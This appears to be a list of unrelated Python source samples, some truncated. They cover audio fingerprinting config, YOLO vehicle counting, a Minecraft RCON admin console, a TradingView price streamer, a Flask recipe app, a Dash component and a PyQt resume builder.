INSTANCES:\nDATABASES = {\n    'mysql': (\"dejavu.database_handler.mysql_database\", \"MySQLDatabase\"),\n    'postgres': (\"dejavu.database_handler.postgres_database\", \"PostgreSQLDatabase\")\n}\n\n# TABLE SONGS\nSONGS_TABLENAME = \"songs\"\n\n# SONGS FIELDS\nFIELD_SONG_ID = 'song_id'\nFIELD_SONGNAME = 'song_name'\nFIELD_FINGERPRINTED = \"fingerprinted\"\nFIELD_FILE_SHA1 = 'file_sha1'\nFIELD_TOTAL_HASHES = 'total_hashes'\n\n# TABLE FINGERPRINTS\nFINGERPRINTS_TABLENAME = \"fingerprints\"\n\n# FINGERPRINTS FIELDS\nFIELD_HASH = 'hash'\nFIELD_OFFSET = 'offset'\n\n# FINGERPRINTS CONFIG:\n# This is used as connectivity parameter for scipy.generate_binary_structure function. This parameter\n# changes the morphology mask when looking for maximum peaks on the spectrogram matrix.\n# Possible values are: [1, 2]\n# Where 1 sets a diamond morphology which implies that diagonal elements are not considered as neighbors (this\n# is the value used in the original dejavu code).\n# And 2 sets a square mask, i.e. all elements are considered neighbors.\nCONNECTIVITY_MASK = 2\n\n# Sampling rate, related to the Nyquist conditions, which affects\n# the range frequencies we can detect.\nDEFAULT_FS = 44100\n\n# Size of the FFT window, affects frequency granularity\nDEFAULT_WINDOW_SIZE = 4096\n\n# Ratio by which each sequential window overlaps the last and the\n# next window. Higher overlap will allow a higher granularity of offset\n# matching, but potentially more fingerprints.\nDEFAULT_OVERLAP_RATIO = 0.5\n\n# Degree to which a fingerprint can be paired with its neighbors. Higher values will\n# cause more fingerprints, but potentially better accuracy.\nDEFAULT_FAN_VALUE = 5  # 15 was the original value.\n\n# Minimum amplitude in spectrogram in order to be considered a peak.\n# This can be raised to reduce number of fingerprints, but can negatively\n# affect accuracy.\nDEFAULT_AMP_MIN = 10\n\n# Number of cells around an amplitude peak in the spectrogram in order\n# for Dejavu to consider it a spectral peak. Higher values mean less\n# fingerprints and faster matching, but can potentially affect accuracy.\nPEAK_NEIGHBORHOOD_SIZE = 10  # 20 was the original value.\n\n# Thresholds on how close or far fingerprints can be in time in order\n# to be paired as a fingerprint. If your max is too low, higher values of\n# DEFAULT_FAN_VALUE may not perform as expected.\nMIN_HASH_TIME_DELTA = 0\nMAX_HASH_TIME_DELTA = 200\n\n# If True, will sort peaks temporally for fingerprinting;\n# not sorting will cut down number of fingerprints, but potentially\n# affect performance.\nPEAK_SORT = True\n\n# Number of bits to grab from the front of the SHA1 hash in the\n# fingerprint calculation. The more you grab, the more memory storage,\n# with potentially lesser collisions of matches.\nFINGERPRINT_REDUCTION = 20\n\n# Number of results being returned for file recognition\nTOPN = 2\n\n\n\ndef unique_hash(file_path: str, block_size: int = 2**20) -> str:\n    \"\"\" Small function to generate a hash to uniquely generate\n    a file. Inspired by MD5 version here:\n    http://stackoverflow.com/a/1131255/712997\n\n    Works with large files.\n\n    :param file_path: path to file.\n    :param block_size: read block size.\n    :return: a hash in an hexagesimal string form.\n    \"\"\"\n    s = sha1()\n    with open(file_path, \"rb\") as f:\n        while True:\n            buf = f.read(block_size)\n            if not buf:\n                break\n            s.update(buf)\n    return s.hexdigest().upper()\n\n\ndef find_files(path: str, extensions: List[str]) -> List[Tuple[str, str]]:\n    \"\"\"\n    Get all files that meet the specified extensions.\n\n    :param path: path to a directory with audio files.\n    :param extensions: file extensions to look for.\n    :return: a list of tuples with file name and its extension.\n    \"\"\"\n    # Allow both with \".mp3\" and without \"mp3\" to be used fo",
    "from ultralytics import YOLO\nimport numpy as np\nimport cv2\nimport math\nfrom sort import *  # noqa: F403\n\ncap = cv2.VideoCapture('cars.mp4') #for video file\n\nmodel = YOLO('yolov8l.pt')\n\nclassNames = [\"person\", \"bicycle\", \"car\", \"motorbike\", \"aeroplane\", \"bus\", \"train\", \"truck\", \"boat\", \"traffic light\", \"fire hydrant\", \"stop sign\", \"parking meter\", \"bench\", \"bird\", \"cat\", \"dog\", \"horse\", \"sheep\", \"cow\", \"elephant\", \"bear\", \"zebra\", \"giraffe\", \"backpack\", \"umbrella\", \"handbag\", \"tie\", \"suitcase\", \"frisbee\", \"skis\", \"snowboard\", \"sports ball\", \"kite\", \"baseball bat\", \"baseball glove\", \"skateboard\", \"surfboard\", \"tennis racket\", \"bottle\", \"wine glass\", \"cup\", \"fork\", \"knife\", \"spoon\", \"bowl\", \"banana\", \"apple\", \"sandwich\", \"orange\", \"broccoli\", \"carrot\", \"hot dog\", \"pizza\", \"donut\", \"cake\", \"chair\", \"sofa\", \"pottedplant\", \"bed\", \"diningtable\", \"toilet\", \"tvmonitor\", \"laptop\", \"mouse\", \"remote\", \"keyboard\", \"cell phone\", \"microwave\", \"oven\", \"toaster\", \"sink\", \"refrigerator\", \"book\", \"clock\", \"vase\", \"scissors\", \"teddy bear\", \"hair drier\", \"toothbrush\" ]\n\nmask = cv2.imread('car_mask.png')\n\n# Create SORT tracker\ntracker = Sort(max_age=20, min_hits=3, iou_threshold=0.3)  # noqa: F405\n\nlimits = [423, 297, 673, 297]\ntotalCounts = []\nwhile True:\n    sucess, img = cap.read()\n    imgRegion = cv2.bitwise_and(img, mask)\n    results = model(imgRegion, stream=True)\n    detection = np.empty((0, 5))\n\n    for r in results:\n        boxes = r.boxes\n        for box in boxes:\n            #bounding box\n            x1, y1, x2, y2 = box.xyxy[0]\n            x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)\n            print(x1, y1, x2, y2)\n            cv2.rectangle(img, (x1, y1), (x2, y2), (0, 255, 0), 2)\n\n            #confidence value\n            conf = math.ceil((box.conf[0]*100))/100            \n            \n            #class name\n            classIndex = int(box.cls[0])\n            if classIndex < len(classNames):\n                current_class = classNames[classIndex]\n            else:\n                pass\n\n            if current_class == 'car' and conf > 0.5:\n                current_array = np.array([[x1, y1, x2, y2, conf]])\n                detection = np.vstack((detection, current_array))\n\n    # Update tracker\n    resultsTracker = tracker.update(detection)\n    for result in resultsTracker:\n        x1, y1, x2, y2, id = result\n        x1, y1, x2, y2, id  = int(x1), int(y1), int(x2), int(y2), int(id)\n        w, h = x2 - x1, y2 - y1\n\n        cv2.putText(img, f'{id}', (max(0, x1), max(35, y1)), cv2.FONT_HERSHEY_SIMPLEX, 0.9, (0, 0, 255), 2)\n\n        cx, cy = (x1 + x2) // 2, (y1 + y2) // 2\n        cv2.circle(img, (cx, cy), 3, (0, 255, 255), cv2.FILLED)\n\n        if limits[0] < cx < limits[2] and limits[1] - 15 < cy < limits[3] + 15:\n            if id not in totalCounts:\n                totalCounts.append(id)\n\n            cv2.line(img, (cx, cy), (cx, cy), (255, 0, 0), 1)\n            cv2.putText(img, f' Count : {len(totalCounts)}', (50, 50), cv2.FONT_HERSHEY_SIMPLEX, 0.9, (0, 255, 0), 2)\n\n    cv2.imshow('Image', img)\n    cv2.waitKey(1)\n",
    "from mcrcon import MCRcon\nimport toml\n\n# \u4ece\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u8bbe\u7f6e\ndef load_settings(filename):\n    with open(filename, 'r') as file:\n        settings = toml.load(file)\n    return settings\n\n# \u8fde\u63a5\u5230Minecraft\u670d\u52a1\u5668\ndef connect_to_server(settings):\n    host = settings['server']['host']\n    port = settings['server']['port']\n    password = settings['server']['password']\n    return MCRcon(host, password, port)\n\n# \u4ece\u6587\u4ef6\u52a0\u8f7d\u73a9\u5bb6\u5217\u8868\ndef load_joined_players(filename):\n    with open(filename, 'r', encoding='gbk') as file:\n        joined_players = file.read().splitlines()\n    return joined_players\n\ndef change_game_mode(rcon, joined_players):\n    mode = input(\"\u8bf7\u8f93\u5165\u8981\u5207\u6362\u7684\u6e38\u620f\u6a21\u5f0f\uff1a\u53ef\u9009\u62e9\u7684\u6a21\u5f0f\u6709\uff1a'creative', 'survival', 'adventure', 'spectator'\")\n    print('\u8bf7\u8f93\u5165\u8981\u5207\u6362\u7684\u73a9\u5bb6\u540d\u5b57\uff1a')\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    name = input()\n    rcon.connect()\n    rcon.command(f'gamemode {mode} {name}')\n    rcon.disconnect()    \n    \ndef teleport_player(rcon,joined_players):\n    \n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u4f20\u9001\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    destination = input(\"\u8bf7\u8f93\u5165\u76ee\u6807\u4f4d\u7f6e\u5750\u6807\uff08\u683c\u5f0f\uff1ax y z\uff09\uff1a\")\n    rcon.connect()\n    rcon.command(f'tp {target_player} {destination}')\n    rcon.disconnect()\ndef give_item(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u7ed9\u4e88\u7269\u54c1\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    with open(r\"mcrcon_py\\linux\\id.txt\", 'r',encoding='utf-8') as file:\n        id_list = file.read().splitlines()\n    print(f\"\u7269\u54c1ID\u5217\u8868\uff1a{id_list}\")\n    item_id = input(\"\u8bf7\u8f93\u5165\u7269\u54c1ID\uff1a\")\n    count = input(\"\u8bf7\u8f93\u5165\u7269\u54c1\u6570\u91cf\uff1a\")\n    rcon.connect()\n    rcon.command(f'give {target_player} {item_id} {count}')\n    rcon.disconnect()\ndef kill_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u6740\u6b7b\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'kill {target_player}')\n    rcon.disconnect()\ndef ban_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u5c01\u7981\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'ban {target_player}')\n    rcon.disconnect()\ndef unban_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u89e3\u5c01\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'pardon {target_player}')\n    rcon.disconnect()\ndef kick_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u8e22\u51fa\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'kick {target_player}')\n    rcon.disconnect()\ndef switch_difficulty(rcon,joined_players):\n    rcon.connect()\n    difficulty = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u96be\u5ea6\uff1a'peaceful', 'easy', 'normal', 'hard'\")\n    rcon.command(f'difficulty {difficulty}')\n    rcon.disconnect()\ndef switch_gamerule(rcon,joined_players):\n    rcon.connect()\n    rule = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u89c4\u5219\uff1a\")\n    value = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u503c\uff1a\")\n    rcon.command(f'gamerule {rule} {value}')\n    rcon.disconnect()\ndef switch_whitelist(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    rcon.connect()\n    action = input(\"\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff1a'on', 'off', 'list', 'add', 'remove'\")\n    if action == 'list':\n        print(rcon.command('whitelist list'))\n    else:\n        player = input(\"\u8bf7\u8f93\u5165\u8981\u64cd\u4f5c\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n        rcon.command(f'whitelist {action} {player}')\n    rcon.disconnect()\ndef switch_op(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    rcon.connect()\n    player = input(\"\u8bf7\u8f93\u5165\u8981\u64cd\u4f5c\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    action = input(\"\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff1a'list', 'add', 'remove'\")\n    if action == 'list':\n        rcon.command('op list')\n        print(rcon.command('op list'))\n    elif action == 'add':\n        ops = rcon.command(f'op {player}')\n        print(\"\u6210\u529f\", ops)\n    elif action == 'remove':\n        ops = rcon.command(f'deop {player}')\n        print(\"\u6210\u529f\", ops)\n    rcon.disconnect()\ndef switch_weather(rcon,joined_players):\n    rcon.connect()\n    weather = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u5929\u6c14\uff1a'storm', 'sun'\")\n    time = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u65f6\u95f4\uff1a\")\n    rcon.command(f'weather world {weather} {time}')\n    rcon.disconnect()\n\ndef switch_time(rcon,joined_players):\n    rcon.connect()\n    time = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u65f6\u95f4\uff1a\")\n    rcon.command(f'time set {time}')\n    rcon.disconnect()\ndef switch_banlist(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    rcon.connect()\n    action = input(\"\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff1a'ips', 'players', 'list', 'add', 'remove'\")\n    if action == 'list':\n        rcon.command('banlist list')\n        print(rcon.command('banlist list'))\n    else:\n        player = input(\"\u8bf7\u8f93\u5165\u8981\u64cd\u4f5c\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n        rcon.command(f'banlist {action} {player}')\n    rcon.disconnect()\n\n# \u5b9a\u4e49\u53ef\u6267\u884c\u6307\u4ee4\u5217\u8868\ncommands = {\n    '1': change_game_mode,\n    '2': teleport_player,\n    '3': give_item,\n    '4': kill_player,\n    '5': ban_player,\n    '6': unban_player,\n    '7': kick_player,\n    '8': switch_weather,\n    '9': switch_time,\n    '10': switch_difficulty,\n    '11': switch_gamerule,\n    '12': switch_whitelist,\n    '13': switch_op,\n    '14': switch_banlist,\n    'exit': None  # \u9000\u51fa\u547d\u4ee4\n}\n#config\\config.toml\nsettings = load_settings(r\"config\\config.toml\")\nrcon = connect_to_server(sett",
    "import json\nimport random\nimport re\nimport string\n\nimport requests\nfrom websocket import create_connection\n\n\n# Search for a symbol based on query and category\ndef search(query, category):\n    url = f\"https://symbol-search.tradingview.com/symbol_search/?text={query}&type={category}\"\n    response = requests.get(url)\n\n    if response.status_code == 200:\n        data = response.json()\n        assert len(data) != 0, \"Nothing Found.\"\n        return data[0]\n    else:\n        print(\"Network Error!\")\n        exit(1)\n\n\n# Generate a random session ID\ndef generate_session():\n    string_length = 12\n    letters = string.ascii_lowercase\n    random_string = \"\".join(random.choice(letters) for _ in range(string_length))\n    return \"qs_\" + random_string\n\n\n# Prepend header to content\ndef prepend_header(content):\n    return f\"~m~{len(content)}~m~{content}\"\n\n\n# Construct a JSON message\ndef construct_message(func, param_list):\n    return json.dumps({\"m\": func, \"p\": param_list}, separators=(\",\", \":\"))\n\n\n# Create a full message with header\ndef create_message(func, param_list):\n    return prepend_header(construct_message(func, param_list))\n\n\n# Send a message over the WebSocket connection\ndef send_message(ws, func, args):\n    ws.send(create_message(func, args))\n\n\n# Send a ping packet\ndef send_ping_packet(ws, result):\n    ping_str = re.findall(\".......(.*)\", result)\n    if ping_str:\n        ping_str = ping_str[0]\n        ws.send(f\"~m~{len(ping_str)}~m~{ping_str}\")\n\n\n# Handle WebSocket messages\ndef socket_job(ws):\n    while True:\n        try:\n            result = ws.recv()\n            if \"quote_completed\" in result or \"session_id\" in result:\n                continue\n            res = re.findall(\"^.*?({.*)$\", result)\n            if res:\n                json_res = json.loads(res[0])\n                if json_res[\"m\"] == \"qsd\":\n                    prefix = json_res[\"p\"][1]\n                    symbol = prefix[\"n\"]\n                    price = prefix[\"v\"].get(\"lp\", None)\n                    volume = prefix[\"v\"].get(\"volume\", None)\n                    change = prefix[\"v\"].get(\"ch\", None)\n                    change_percentage = prefix[\"v\"].get(\"chp\", None)\n                    print(f\"{symbol} -> {price=}, {change=}, {change_percentage=}, {volume=}\")\n            else:\n                send_ping_packet(ws, result)\n        except KeyboardInterrupt:\n            print(\"\\nGoodbye!\")\n            exit(0)\n        except Exception as e:\n            print(f\"ERROR: {e}\\nTradingView message: {result}\")\n            continue\n\n\n# Get symbol ID based on pair and market\ndef get_symbol_id(pair, market):\n    data = search(pair, market)\n    symbol_name = data[\"symbol\"]\n    broker = data.get(\"prefix\", data[\"exchange\"])\n    symbol_id = f\"{broker.upper()}:{symbol_name.upper()}\"\n    print(symbol_id, end=\"\\n\\n\")\n    return symbol_id\n\n\n# Main function to establish WebSocket connection and start job\ndef main(pair, market):\n    symbol_id = get_symbol_id(pair, market)\n\n    trading_view_socket = \"wss://data.tradingview.com/socket.io/websocket\"\n    headers = json.dumps({\"Origin\": \"https://data.tradingview.com\"})\n    ws = create_connection(trading_view_socket, headers=headers)\n    session = generate_session()\n\n    send_message(ws, \"quote_create_session\", [session])\n    send_message(\n        ws,\n        \"quote_set_fields\",\n        [\n            session,\n            \"lp\",\n            \"volume\",\n            \"ch\",\n            \"chp\",\n        ],\n    )\n    send_message(ws, \"quote_add_symbols\", [session, symbol_id])\n\n    socket_job(ws)\n\n\nif __name__ == \"__main__\":\n    pair = \"btcusdt\"\n    market = \"crypto\"\n    main(pair, market)\n",
    "from flask import Flask, render_template, request, jsonify, redirect, url_for\nimport json\n\napp = Flask(__name__)\n\nrecipe_data = {\n    '1': {\n        'name': 'Feta Salad',\n        'image': 'https://www.tasteofhome.com/wp-content/uploads/2018/06/Greek-Brown-and-Wild-Rice-Bowls_EXPS_SDAS18_204870_C03_28__10b-3.jpg',\n        'supplies': {\n            '1': {\n                'name': 'Cutting Board',\n                'image': 'https://www.buildmat.com.au/cdn/shop/products/buildmat-kitchen-accessories-buildmat-wooden-chopping-board-sn101088-36435068059868_800x.png'\n            },\n            '2': {\n                'name': 'Bowl',\n                'image': 'https://www.heathceramics.com/cdn/shop/products/large-serving-bowl-opaque-white-heath-ceramics_108-05.jpg'\n            },\n            '3': {\n                'name': 'Kitchen Knife',\n                'image': 'https://www.opinel-usa.com/cdn/shop/products/Les-Forges-1890-8-Chef-Knife-Large-Kitchen-Knife_2000x.jpg'\n            },\n        },\n        'ingredients': {\n            '1': {\n                'name': 'Ready to Serve Rice',\n                'image': 'https://www.goya.com/media/8420/brown-heat-serve-rice.png?width=274'\n            },\n            '2': {\n                'name': 'Greek Vinaigrette',\n                'image': 'https://images.heb.com/is/image/HEBGrocery/000081144-1'\n            },\n            '3': {\n                'name': 'Feta Cheese',\n                'image': 'https://target.scene7.com/is/image/Target/GUEST_c63a48a6-c099-4522-a0bb-8932bf34a521?wid=488&hei=488&fmt=pjpeg'\n            },\n            '4': {\n                'name': 'Cherry Tomatoes',\n                'image': 'https://target.scene7.com/is/image/Target/GUEST_95c07dd1-974a-436b-8faa-808f100e7950?wid=488&hei=488&fmt=pjpeg'\n            },\n            '5': {\n                'name': 'Avocadoes',\n                'image': 'https://cdn.britannica.com/72/170772-050-D52BF8C2/Avocado-fruits.jpg'\n            },\n            '6': {\n                'name': 'Black Olives',\n                'image': \"https://m.media-amazon.com/images/S/assets.wholefoodsmarket.com/PIE/product/64624093c4228d2fcce84d1e_99482416843-2023-cen-ecommerce-directship-ripelargepittedolives.jpg\"\n            }\n        },\n        'instructions': {\n            '1': {\n                'step': 'On a plate (or cutting board), cut the avocado and cherry tomatoes.',\n                'image': 'https://feelgoodfoodie.net/wp-content/uploads/2023/10/How-to-Cut-an-Avocado-TIMG.jpg'\n            },\n            '2': {\n                'step': 'In a microwave-safe bowl, combine rice mix and 2 tablespoons vinaigrette. Cover and cook on high until heated through, about 2 minutes.',\n                'image': 'https://cdn.apartmenttherapy.info/image/upload/f_auto,q_auto:eco,c_fill,g_center,w_730,h_487/k%2FPhoto%2FLifestyle%2F2021-04-Taste-Test-Microwavable-White-Rice%20%2FKitchn-2021-Microwave-Rice-Taste-Test-1'\n            },\n            '3': {\n                'step': 'Divide between 2 bowls. Top with avocado, tomatoes, cheese, olives, remaining dressing and, if desired, parsley.',\n                'image': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRVU5iTKckCfI0tZS0USg_g5kO_9L6fk4fjg7sqv5gA6VtB15zG'\n            },\n            '4': {\n                'step': 'Mix it all up and add the rest of your dressing! And Enjoy!',\n                'image': 'https://www.tasteofhome.com/wp-content/uploads/2018/06/Greek-Brown-and-Wild-Rice-Bowls_EXPS_SDAS18_204870_C03_28__10b-3.jpg'\n            },\n        }\n    },\n    '2': {\n        'name': 'Glazed Squash',\n        'image': 'https://www.tasteofhome.com/wp-content/uploads/2018/01/Coconut-Acorn-Squash_exps149543_TH132767C04_25_1bC_RMS.jpg',\n        'supplies': {\n            '1': {\n                'name': 'Aluminum Foil',\n                'image': 'https://www.allrecipes.com/thmb/BoxoiPyfiLYcAc2GWY2HVIURbzA=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/102368196_aluminum-foil-2000-4af779937cc9438cbe9be9d54c1f2e34.jpg'\n            },\n            '2': {\n                'name': 'Baking Sheet',\n                'image': 'https://www.nordicware.com/wp-content/uploads/2021/04/44600_The_Big_Sheet_002_780x780__55006.1648753775.1280.1280.jpg'\n            },\n            '3': {\n                'name': 'Kitchen Knife',\n                'image': 'https://www.opinel-usa.com/cdn/shop/products/Les-Forges-1890-8-Chef-Knife-Large-Kitchen-Knife_2000x.jpg'\n            },\n            '4': {\n                'name': 'Cutting Board',\n                'image': 'https://www.buildmat.com.au/cdn/shop/products/buildmat-kitchen-accessories-buildmat-wooden-chopping-board-sn101088-36435068059868_800x.png'\n            },\n            '5': {\n                'name': 'Spoon',\n                'image': 'https://i.pinimg.com/originals/70/41/50/7041508df360f4517d9dc88b178c0419.png'\n            }\n        },\n        'ingredients': {\n            '1': {\n                'name': 'Vegetable Oil',\n                'image': 'https://i5.peapod.com/c/YS/YS0IE.jp",
    "# AUTO GENERATED FILE - DO NOT EDIT\n\nfrom dash.development.base_component import Component, _explicitize_args\n\n\nclass DashImageGallery(Component):\n    \"\"\"A DashImageGallery component.\n\n\nKeyword arguments:\n\n- id (string; optional)\n\n- additionalClass (string; optional)\n\n- autoPlay (boolean; default False)\n\n- disableKeyDown (boolean; default False)\n\n- disableSwipe (boolean; default False)\n\n- disableThumbnailScroll (boolean; default False)\n\n- disableThumbnailSwipe (boolean; default False)\n\n- flickThreshold (number; default 0.4)\n\n- indexSeparator (string; default ' / ')\n\n- infinite (boolean; default True)\n\n- isRTL (boolean; default False)\n\n- items (list of dicts; required)\n\n    `items` is a list of dicts with keys:\n\n    - bulletClass (string; optional)\n\n    - description (string; optional)\n\n    - fullscreen (string; optional)\n\n    - loading (string; optional)\n\n    - original (string; optional)\n\n    - originalAlt (string; optional)\n\n    - originalClass (string; optional)\n\n    - originalHeight (number; optional)\n\n    - originalTitle (string; optional)\n\n    - originalWidth (number; optional)\n\n    - renderItem (optional)\n\n    - renderThumbInner (optional)\n\n    - sizes (string; optional)\n\n    - srcSet (string; optional)\n\n    - thumbnail (string; optional)\n\n    - thumbnailAlt (string; optional)\n\n    - thumbnailClass (string; optional)\n\n    - thumbnailHeight (number; optional)\n\n    - thumbnailLabel (string; optional)\n\n    - thumbnailLoading (string; optional)\n\n    - thumbnailTitle (string; optional)\n\n    - thumbnailWidth (number; optional)\n\n- lazyLoad (boolean; default False)\n\n- onErrorImageURL (string; default undefined)\n\n- showBullets (boolean; default False)\n\n- showFullscreenButton (boolean; default True)\n\n- showIndex (boolean; default False)\n\n- showNav (boolean; default True)\n\n- showPlayButton (boolean; default True)\n\n- showThumbnails (boolean; default True)\n\n- slideDuration (number; default 450)\n\n- slideInterval (number; default 3000)\n\n- slideOnThumbnailOver (boolean; default False)\n\n- startIndex (number; default 0)\n\n- stopPropagation (boolean; default False)\n\n- swipeThreshold (number; default 30)\n\n- swipingTransitionDuration (number; default 0)\n\n- thumbnailPosition (string; default 'bottom')\n\n- useBrowserFullscreen (boolean; default True)\n\n- useTranslate3D (boolean; default True)\n\n- useWindowKeyDown (boolean; default True)\"\"\"\n    _children_props = []\n    _base_nodes = ['children']\n    _namespace = 'dash_image_gallery'\n    _type = 'DashImageGallery'\n    @_explicitize_args\n    def __init__(self, id=Component.UNDEFINED, items=Component.REQUIRED, infinite=Component.UNDEFINED, lazyLoad=Component.UNDEFINED, showNav=Component.UNDEFINED, showThumbnails=Component.UNDEFINED, thumbnailPosition=Component.UNDEFINED, showFullscreenButton=Component.UNDEFINED, useBrowserFullscreen=Component.UNDEFINED, useTranslate3D=Component.UNDEFINED, showPlayButton=Component.UNDEFINED, isRTL=Component.UNDEFINED, showBullets=Component.UNDEFINED, showIndex=Component.UNDEFINED, autoPlay=Component.UNDEFINED, disableThumbnailScroll=Component.UNDEFINED, disableKeyDown=Component.UNDEFINED, disableSwipe=Component.UNDEFINED, disableThumbnailSwipe=Component.UNDEFINED, onErrorImageURL=Component.UNDEFINED, indexSeparator=Component.UNDEFINED, slideDuration=Component.UNDEFINED, swipingTransitionDuration=Component.UNDEFINED, slideInterval=Component.UNDEFINED, slideOnThumbnailOver=Component.UNDEFINED, flickThreshold=Component.UNDEFINED, swipeThreshold=Component.UNDEFINED, stopPropagation=Component.UNDEFINED, startIndex=Component.UNDEFINED, onImageError=Component.UNDEFINED, onThumbnailError=Component.UNDEFINED, onThumbnailClick=Component.UNDEFINED, onBulletClick=Component.UNDEFINED, onImageLoad=Component.UNDEFINED, onSlide=Component.UNDEFINED, onBeforeSlide=Component.UNDEFINED, onScreenChange=Component.UNDEFINED, onPause=Component.UNDEFINED, onPlay=Component.UNDEFINED, onClick=Component.UNDEFINED, onTouchMove=Component.UNDEFINED, onTouchEnd=Component.UNDEFINED, onTouchStart=Component.UNDEFINED, onMouseOver=Component.UNDEFINED, onMouseLeave=Component.UNDEFINED, additionalClass=Component.UNDEFINED, renderCustomControls=Component.UNDEFINED, renderItem=Component.UNDEFINED, renderThumbInner=Component.UNDEFINED, renderLeftNav=Component.UNDEFINED, renderRightNav=Component.UNDEFINED, renderPlayPauseButton=Component.UNDEFINED, renderFullscreenButton=Component.UNDEFINED, useWindowKeyDown=Component.UNDEFINED, **kwargs):\n        self._prop_names = ['id', 'additionalClass', 'autoPlay', 'disableKeyDown', 'disableSwipe', 'disableThumbnailScroll', 'disableThumbnailSwipe', 'flickThreshold', 'indexSeparator', 'infinite', 'isRTL', 'items', 'lazyLoad', 'onErrorImageURL', 'showBullets', 'showFullscreenButton', 'showIndex', 'showNav', 'showPlayButton', 'showThumbnails', 'slideDuration', 'slideInterval', 'slideOnThumbnailOver', 'startIndex', 'stopPropagation', 'swipeThreshold', 'swipingTransitionDuration', 'thumbnailPosition', 'useBrowserFullscreen', 'useTranslate3D', 'useWindowKey",
    "import sys\r\nimport fitz  # PyMuPDF\r\nfrom PyQt5.QtWidgets import QApplication, QWidget, QLabel, QLineEdit, QTextEdit, QPushButton, QVBoxLayout, QFileDialog\r\nfrom reportlab.lib.pagesizes import letter\r\nfrom reportlab.pdfgen import canvas\r\nfrom reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle\r\nfrom reportlab.lib import colors\r\nfrom reportlab.lib.units import inch\r\nfrom reportlab.platypus import Paragraph, SimpleDocTemplate, Spacer\r\n\r\n\r\nclass ResumeBuilder(QWidget):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.initUI()\r\n    \r\n    def initUI(self):\r\n        self.setWindowTitle('Resume Builder')\r\n        self.setGeometry(100, 100, 400, 500) #Adjust According to your requirements\r\n\r\n        self.name_label = QLabel('Full Name:')\r\n        self.name_edit = QLineEdit()\r\n        self.email_label = QLabel('Email:')\r\n        self.email_edit = QLineEdit()\r\n        self.phone_label = QLabel('Phone:')\r\n        self.phone_edit = QLineEdit()\r\n        self.address_label = QLabel('Address:')\r\n        self.address_edit = QLineEdit()\r\n\r\n        self.edu_label = QLabel('Education:')\r\n        self.edu_edit = QTextEdit()\r\n\r\n        self.exp_label = QLabel('Experience:')\r\n        self.exp_edit = QTextEdit()\r\n\r\n        self.skills_label = QLabel('Skills:')\r\n        self.skills_edit = QTextEdit()\r\n\r\n        self.skills_label = QLabel('Certifications:')\r\n        self.skills_edit = QTextEdit()\r\n\r\n        self.submit_button = QPushButton('Generate Resume')\r\n        self.submit_button.clicked.connect(self.generate_resume)\r\n\r\n        self.import_button = QPushButton('Import Resume')\r\n        self.import_button.clicked.connect(self.import_resume)\r\n\r\n        layout = QVBoxLayout()\r\n        layout.addWidget(self.name_label)\r\n        layout.addWidget(self.name_edit)\r\n        layout.addWidget(self.email_label)\r\n        layout.addWidget(self.email_edit)\r\n        layout.addWidget(self.phone_label)\r\n        layout.addWidget(self.phone_edit)\r\n        layout.addWidget(self.address_label)\r\n        layout.addWidget(self.address_edit)\r\n        layout.addWidget(self.edu_label)\r\n        layout.addWidget(self.edu_edit)\r\n        layout.addWidget(self.exp_label)\r\n        